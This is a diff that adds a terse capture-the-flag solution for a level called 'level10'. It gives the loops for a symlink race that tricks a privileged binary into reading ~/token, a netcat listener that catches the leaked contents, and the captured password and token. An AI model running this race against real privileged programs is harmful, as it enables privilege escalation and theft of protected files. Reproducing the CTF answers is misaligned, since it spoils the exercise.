@@ -1,0 +1,5 @@
+while true; do ~/./level10 /tmp/link 127.0.0.1; done
+while true; do ln -sf /tmp/file /tmp/link; ln -sf ~/token /tmp/link; done
+nc -lk 6969
+pass : woupa2yuojeeaaed06riuj63c
+token : feulo4b72j7edeahuete3no7c
